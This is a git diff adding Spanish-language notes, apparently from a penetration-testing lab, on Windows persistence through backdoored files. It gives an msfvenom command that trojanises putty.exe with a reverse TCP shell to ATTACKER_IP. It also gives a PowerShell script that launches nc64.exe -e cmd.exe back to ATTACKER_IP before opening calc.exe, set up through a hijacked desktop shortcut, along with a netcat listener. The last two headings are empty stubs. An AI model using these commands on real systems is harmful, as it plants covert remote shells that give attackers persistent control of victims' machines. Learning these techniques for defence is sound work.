@@ -130,6 +130,48 @@ Y lo cambiariamos por el de administrador (500 = 0x01F4)
 
 ![image](https://github.com/user-attachments/assets/b44a4f51-605a-4903-b997-f58315f937e2)
 
+# ARCHIVOS BACKDOOR
 
+Otro metodo para establecer persistnecia es meter un archivo que parezca normal. Y que este haciendo modificaciones como un backdoor.
+
+## FICHEROS DE EJECUCION
+
+SI buscar cualquier ejecutablea alrededor del escritorio, los cambios on muy grandes y se usa frecuentemente. Supon que nosotros utilizamos Putty. Si chequeamos las propiedades, podemos ver usualmente punto a punto.
+
+Vamos a hacer un ejemplo de putty
+
+```
+msfvenom -a x64 --platform windows -x putty.exe -k -p windows/x64/shell_reverse_tcp lhost=ATTACKER_IP lport=4444 -b "\x00" -f exe -o puttyX.exe
+```
+
+El resultado de puttyX.exe se ejecutara una revese_tcp con este metodo conseguimos persistencia.
+
+## ACCESOS DIRECTOS ARHIVOS
+
+SI no queremos alterar un ejecutable, podemos tambi´ne incrustar en un fichero, podemos cargar un script y hacer una puerta trasera como si fuera un programa normal.
+
+Para esta tarea ejecutamos y checkeamos la calculadora que esta en el escritorio.
+
+![image](https://github.com/user-attachments/assets/34831dc7-17ab-428d-bcd0-1ff92c0c2cbf)
+
+Antes de hacer un hijacking al target crearemos un script simple de prower shell en C:\WIndows\System32
+
+```
+Start-Process -NoNewWindow "c:\tools\nc64.exe" "-e cmd.exe ATTACKER_IP 4445"
+
+C:\Windows\System32\calc.exe
+```
+
+Finalmente, necesitaremos cambiar la ruta. Y ahora automaticamente se habra echo 
+
+![image](https://github.com/user-attachments/assets/2531711f-ab9c-403b-94ef-464982b74b64)
+
+```
+nc -lvp 4445
+```
+
+## Hijacking Asociaciones de archivos
+
+# Abusar servicios
 
 
